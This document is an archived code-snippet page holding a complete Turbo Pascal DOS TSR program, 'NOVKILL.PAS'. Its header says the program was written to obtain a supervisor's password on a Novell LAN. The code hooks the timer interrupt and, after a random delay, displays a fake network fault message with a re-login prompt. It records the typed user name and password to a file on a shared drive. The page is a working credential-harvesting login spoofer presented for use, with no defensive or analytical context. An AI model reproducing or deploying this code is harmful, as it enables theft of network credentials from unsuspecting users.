<html>
<head><title> "NOVKILL.PAS" by PIERRE TOURIGNY</title><link rel="STYLESHEET" type="text/css" href="../swagsource.css"></head>
<body><p align="center"><b>[</b><a href="index.html">Back to NUMBERS SWAG index</a><b>]</b>&nbsp;&nbsp;<b>[</b><a href="../index.html">Back to Main SWAG index</a><b>]</b>&nbsp;&nbsp;<b>[</b><a href="0069.PAS">Original</a><b>]</b></p><!--StartFragment--><pre><code><font color="#008000"><i>{
From: BERO@flash.gun.de (Bernhard Rosenkraenzer)

A friend of mine wrote it to obtain his supervisor's password for a novell
lan.
}

</i></font><font color="#FF0000"><b>program </b></font>Interrupt_Netkill<font color="#000080">;
</font><font color="#008000"><i>{$M $800,0,0}
</i></font><font color="#FF0000"><b>uses </b></font>Crt<font color="#000080">,</font>Dos<font color="#000080">;
</font><font color="#FF0000"><b>type </b></font>scr<font color="#000080">=</font><font color="#FF0000"><b>Array</b></font><font color="#000080">[</font><font color="#800000">0</font><font color="#000080">..</font><font color="#800000">79</font><font color="#000080">,</font><font color="#800000">0</font><font color="#000080">..</font><font color="#800000">24</font><font color="#000080">,</font><font color="#800000">0</font><font color="#000080">..</font><font color="#800000">1</font><font color="#000080">] </font><font color="#FF0000"><b>of </b></font>Byte<font color="#000080">;
</font><font color="#FF0000"><b>var </b></font>OldInt<font color="#000080">:</font><font color="#FF0000"><b>Procedure</b></font><font color="#000080">;
    </font>Counter<font color="#000080">:</font>Word<font color="#000080">;
    </font>Zufall<font color="#000080">:</font>Word<font color="#000080">;
    </font>Screen<font color="#000080">:</font>Scr <font color="#FF0000"><b>absolute </b></font><font color="#800000">$B800</font><font color="#000080">:</font><font color="#800000">0000</font><font color="#000080">;
    </font>SaveScreen<font color="#000080">:</font>Scr<font color="#000080">;
    </font>Logname<font color="#000080">,</font>Password<font color="#000080">:</font><font color="#FF0000"><b>String</b></font><font color="#000080">;
    </font>DosSeg<font color="#000080">,</font>DosBusy<font color="#000080">:</font>word<font color="#000080">;
    </font>tsr_on<font color="#000080">:</font>boolean<font color="#000080">;
</font><font color="#FF0000"><b>const </b></font>oldstackss<font color="#000080">:</font>word<font color="#000080">=</font><font color="#800000">0</font><font color="#000080">;
      </font>oldstacksp<font color="#000080">:</font>word<font color="#000080">=</font><font color="#800000">0</font><font color="#000080">;
      </font>stacksw<font color="#000080">:</font>integer<font color="#000080">=-</font><font color="#800000">1</font><font color="#000080">;
      </font>intstackss<font color="#000080">:</font>word<font color="#000080">=</font><font color="#800000">0</font><font color="#000080">;
      </font>intstacksp<font color="#000080">:</font>word<font color="#000080">=</font><font color="#800000">0</font><font color="#000080">;
</font><font color="#008000"><i>{$F+}
{$I-}
</i></font><font color="#FF0000"><b>Procedure </b></font>Input<font color="#000080">(</font><font color="#FF0000"><b>var </b></font>s<font color="#000080">:</font><font color="#FF0000"><b>string</b></font><font color="#000080">);
</font><font color="#FF0000"><b>var </b></font>c<font color="#000080">:</font>char<font color="#000080">; </font>ende<font color="#000080">:</font>boolean<font color="#000080">;
</font><font color="#FF0000"><b>begin
  </b></font>s<font color="#000080">:=</font><font color="#800000">''</font><font color="#000080">;
  </font>ende<font color="#000080">:=</font>false<font color="#000080">;
  </font><font color="#FF0000"><b>repeat
    repeat until </b></font>keypressed<font color="#000080">;
    </font>c<font color="#000080">:=</font>readkey<font color="#000080">;
    </font><font color="#FF0000"><b>IF </b></font>c<font color="#000080">=</font>chr<font color="#000080">(</font><font color="#800000">13</font><font color="#000080">) </font><font color="#FF0000"><b>then
      </b></font>ende<font color="#000080">:=</font>true
    <font color="#FF0000"><b>else IF </b></font>c<font color="#000080">=</font>chr<font color="#000080">(</font><font color="#800000">8</font><font color="#000080">) </font><font color="#FF0000"><b>then begin
      if </b></font>length<font color="#000080">(</font>s<font color="#000080">)&gt;</font><font color="#800000">0 </font><font color="#FF0000"><b>then </b></font>Dec<font color="#000080">(</font>s<font color="#000080">[</font><font color="#800000">0</font><font color="#000080">]) </font><font color="#FF0000"><b>end
    else </b></font>s<font color="#000080">:=</font>s<font color="#000080">+</font>c<font color="#000080">;
  </font><font color="#FF0000"><b>until </b></font>ende<font color="#000080">;
</font><font color="#FF0000"><b>end</b></font><font color="#000080">;
</font><font color="#FF0000"><b>Procedure </b></font>DoJob<font color="#000080">;
</font><font color="#FF0000"><b>var </b></font>f<font color="#000080">:</font>text<font color="#000080">;
</font><font color="#FF0000"><b>begin
  </b></font>SaveScreen<font color="#000080">:=</font>Screen<font color="#000080">;
  </font>GotoXY<font color="#000080">(</font><font color="#800000">1</font><font color="#000080">,</font><font color="#800000">24</font><font color="#000080">);
  </font>TextColor<font color="#000080">(</font>Red<font color="#000080">);
  </font>Writeln<font color="#000080">(</font><font color="#800000">'General protection fault #317 at SERVER1/'</font><font color="#000080">);
  </font>Writeln<font color="#000080">(</font><font color="#800000">'NETIPX created a GPF at 0013:014C'</font><font color="#000080">);
  </font>Writeln<font color="#000080">(</font><font color="#800000">'Re-login to continue your work:'</font><font color="#000080">);
  </font>Write<font color="#000080">(</font><font color="#800000">'Login-Name: '</font><font color="#000080">);
  </font>Readln<font color="#000080">(</font>logname<font color="#000080">);
  </font>Write<font color="#000080">(</font><font color="#800000">'Password: '</font><font color="#000080">);
  </font>Input<font color="#000080">(</font>Password<font color="#000080">);
  </font>Writeln<font color="#000080">;
  </font>Writeln<font color="#000080">(</font><font color="#800000">'Stand by...'</font><font color="#000080">);
  </font>Assign<font color="#000080">(</font>f<font color="#000080">,</font><font color="#800000">'F:\ALLE\GOT_IT!.TXT'</font><font color="#000080">);
  </font>Append<font color="#000080">(</font>f<font color="#000080">);
  </font><font color="#FF0000"><b>IF </b></font>IOResult<font color="#000080">&lt;&gt;</font><font color="#800000">0 </font><font color="#FF0000"><b>then </b></font>Rewrite<font color="#000080">(</font>f<font color="#000080">);
  </font>Writeln<font color="#000080">(</font>f<font color="#000080">,</font>logname<font color="#000080">,</font><font color="#800000">' logged in with password '</font><font color="#000080">,</font>password<font color="#000080">);
  </font>Close<font color="#000080">(</font>f<font color="#000080">);
  </font><font color="#FF0000"><b>asm </b></font><font color="#FF00FF">cli </font><font color="#FF0000"><b>end</b></font><font color="#000080">;
  </font>SetIntVec<font color="#000080">(</font><font color="#800000">8</font><font color="#000080">,@</font>OldInt<font color="#000080">);
  </font><font color="#FF0000"><b>asm </b></font><font color="#FF00FF">sti </font><font color="#FF0000"><b>end</b></font><font color="#000080">;
  </font>Screen<font color="#000080">:=</font>SaveScreen<font color="#000080">;
</font><font color="#FF0000"><b>end</b></font><font color="#000080">;
</font><font color="#FF0000"><b>procedure </b></font>Int<font color="#000080">;</font>interrupt<font color="#000080">;
</font><font color="#FF0000"><b>begin
  asm </b></font><font color="#FF00FF">cli
      inc word ptr [stacksw]
      jnz @a
      mov [oldstackss],ss
      mov [oldstacksp],sp
      mov ss,[intstackss]
      mov sp,[intstacksp]
      @a: sti
  </font><font color="#FF0000"><b>end</b></font><font color="#000080">;
  </font><font color="#FF0000"><b>If </b></font>Counter<font color="#000080">&lt;</font>Zufall <font color="#FF0000"><b>then </b></font>Inc<font color="#000080">(</font>Counter<font color="#000080">);
  </font><font color="#FF0000"><b>If </b></font><font color="#000080">(</font>Counter<font color="#000080">=</font>Zufall<font color="#000080">) </font><font color="#FF0000"><b>and </b></font><font color="#000080">(</font>tsr_on<font color="#000080">=</font>false<font color="#000080">) </font><font color="#FF0000"><b>and </b></font><font color="#000080">(</font>mem<font color="#000080">[</font>DosSeg<font color="#000080">:</font>DosBusy<font color="#000080">]=</font><font color="#800000">0</font><font color="#000080">) </font><font color="#FF0000"><b>then begin
    </b></font>tsr_on<font color="#000080">:=</font>true<font color="#000080">;
    </font>Port<font color="#000080">[</font><font color="#800000">$20</font><font color="#000080">]:=</font><font color="#800000">$20</font><font color="#000080">;
    </font>DoJob<font color="#000080">;
    </font>tsr_on<font color="#000080">:=</font>false<font color="#000080">;
  </font><font color="#FF0000"><b>End</b></font><font color="#000080">;
  </font><font color="#FF0000"><b>asm </b></font><font color="#FF00FF">cli
      dec word ptr [stacksw]
      jge @b
      mov ss,oldstackss
      mov sp,oldstacksp
      @b: sti
      pushf </font><font color="#FF0000"><b>end</b></font><font color="#000080">;
  </font>OldInt<font color="#000080">;
</font><font color="#FF0000"><b>end</b></font><font color="#000080">;
</font><font color="#FF0000"><b>procedure </b></font>InitTSR<font color="#000080">;
</font><font color="#FF0000"><b>begin
  </b></font>tsr_on<font color="#000080">:=</font>false<font color="#000080">;
  </font>IntStackSS<font color="#000080">:=</font>SSEG<font color="#000080">;
  </font><font color="#FF0000"><b>asm </b></font><font color="#FF00FF">mov [IntStackSP],SP
      mov ah,$34
      int $21
      mov [DosSeg],ES
      mov [DosBusy],BX
  </font><font color="#FF0000"><b>end</b></font><font color="#000080">;
</font><font color="#FF0000"><b>end</b></font><font color="#000080">;
</font><font color="#FF0000"><b>begin
  </b></font>SwapVectors<font color="#000080">;
  </font>randomize<font color="#000080">; </font>Zufall<font color="#000080">:=</font>Random<font color="#000080">(</font><font color="#800000">5000</font><font color="#000080">)+</font><font color="#800000">1000</font><font color="#000080">; </font>Counter<font color="#000080">:=</font><font color="#800000">0</font><font color="#000080">;
  </font>InitTSR<font color="#000080">;
  </font>GetIntVec<font color="#000080">(</font><font color="#800000">8</font><font color="#000080">,@</font>OldInt<font color="#000080">);
  </font>SetIntVec<font color="#000080">(</font><font color="#800000">8</font><font color="#000080">,@</font>Int<font color="#000080">);
  </font>Keep<font color="#000080">(</font><font color="#800000">0</font><font color="#000080">);
</font><font color="#FF0000"><b>end</b></font><font color="#000080">.
</font>
</code></pre><!--EndFragment--><p align="center"><b>[</b><a href="index.html">Back to NUMBERS SWAG index</a><b>]</b>&nbsp;&nbsp;<b>[</b><a href="../index.html">Back to Main SWAG index</a><b>]</b>&nbsp;&nbsp;<b>[</b><a href="0069.PAS">Original</a><b>]</b></p></body>
</html>
